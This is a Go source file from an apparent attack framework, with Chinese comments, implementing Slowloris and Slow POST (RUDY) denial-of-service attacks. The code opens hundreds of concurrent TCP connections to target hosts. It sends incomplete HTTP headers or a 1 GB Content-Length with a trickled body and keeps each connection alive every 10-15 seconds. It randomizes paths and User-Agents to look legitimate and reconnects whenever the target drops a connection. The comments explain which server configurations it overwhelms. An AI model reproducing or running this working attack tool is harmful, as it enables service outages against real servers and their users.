package attack

import (
	"fmt"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================
// 慢速攻击（Slowloris / Slow POST）：
//   - Slowloris：发送不完整的 HTTP 请求头（无结束空行），然后周期性
//     追加一个 header 行保活——目标服务器等待完整请求头，连接被永久占用，
//     worker 线程/连接池被占满后合法请求无法进入。
//   - Slow POST（RUDY）：发送完整头 + 巨大的 Content-Length，然后逐字节
//     发送 body——目标等待完整 body，连接与内存被占用。
//
// 特征：不依赖带宽与 RTT（每连接每 10-15s 才发几十字节），对未配置
// 请求头/请求体超时（默认配置的 nginx/apache/自研服务）的目标效果显著；
// 内网低延迟场景连接建立极快，占坑速度是公网的数十倍。
// 需要普通 TCP 连接即可（非 root 可用）。
// ============================================================

// slowSlotsPerThread 每线程连接槽数：慢速攻击是"连接数"游戏，
// 总占用连接 = threads × slowSlotsPerThread（默认 50×8 = 400 连接）。
const slowSlotsPerThread = 8

// StartSlowlorisEx 慢速攻击：method=slowloris → 请求头占坑；
// method=slow_post → 请求体占坑。
func StartSlowlorisEx(cfg AttackConfig) *AttackSession {
	kind := strings.TrimPrefix(cfg.Method, "slow_")
	s := NewAttackSession(cfg.Target, cfg.Targets, "slow_"+kind, newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 50
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)
				var targetIdx uint64

				var slotWG sync.WaitGroup
				for slot := 0; slot < slowSlotsPerThread; slot++ {
					slotWG.Add(1)
					go func() {
						defer slotWG.Done()
						tc := newTimeCache()
						var conn net.Conn

						for tc.since(endTime) < 0 {
							select {
							case <-s.StopChan:
								if conn != nil {
									conn.Close()
								}
								return
							default:
							}

							tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
							if !strings.HasPrefix(tgt, "http") {
								tgt = "http://" + tgt
							}

							if conn == nil {
								u, err := url.Parse(tgt)
								if err != nil || u.Host == "" {
									atomic.AddUint64(&s.Stats.Errors, 1)
									time.Sleep(time.Second)
									continue
								}
								hostPort := u.Host
								if _, _, err := net.SplitHostPort(hostPort); err != nil {
									hostPort = hostPort + ":80"
								}
								c, err := net.DialTimeout("tcp", hostPort, 5*time.Second)
								if err != nil {
									atomic.AddUint64(&s.Stats.Errors, 1)
									time.Sleep(time.Second)
									continue
								}
								conn = c
								// 发送不完整请求（占坑核心）：
								// slowloris → 请求头无结束空行；slow_post → 头完整但 body 巨大
								header := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n",
									randomSlowPath(rng), u.Host, randomUA(rng))
								if kind == "post" {
									header += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 1073741824\r\n\r\n"
								}
								conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
								if _, err := conn.Write([]byte(header)); err != nil {
									conn.Close()
									conn = nil
									atomic.AddUint64(&s.Stats.Errors, 1)
									continue
								}
								if kind == "post" {
									// 先发 1 字节 body，让服务器开始等待剩余 Content-Length
									conn.Write([]byte("a"))
								}
								atomic.AddUint64(&s.Stats.PacketsSent, 1)
								atomic.AddUint64(&s.Stats.BytesSent, uint64(len(header)+1))
							}

							// 保活间隔 10-15s 随机：每周期发少量数据重置服务器 idle 计时
							keepAlive := 10*time.Second + time.Duration(rng.Intn(5))*time.Second
							select {
							case <-s.StopChan:
								conn.Close()
								return
							case <-time.After(keepAlive):
							}
							if tc.since(endTime) >= 0 {
								conn.Close()
								return
							}

							conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
							var keep []byte
							if kind == "post" {
								keep = []byte("a") // slow POST：逐字节挤 body
							} else {
								keep = []byte("X-a: " + randomAlpha(rng, 6) + "\r\n") // slowloris：追加 header
							}
							if _, err := conn.Write(keep); err != nil {
								// 目标断开（超时/防护）：重建连接继续占坑
								conn.Close()
								conn = nil
								atomic.AddUint64(&s.Stats.Errors, 1)
								continue
							}
							atomic.AddUint64(&s.Stats.PacketsSent, 1)
							atomic.AddUint64(&s.Stats.BytesSent, uint64(len(keep)))
							tc.refresh()
						}
						if conn != nil {
							conn.Close()
						}
					}()
				}
				slotWG.Wait()
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

// randomSlowPath 慢速攻击的随机路径（保持请求合法外观）
func randomSlowPath(rng *FastRNG) string {
	if rng.Intn(3) == 0 {
		return "/"
	}
	return "/" + randomAlpha(rng, 4+rng.Intn(8))
}
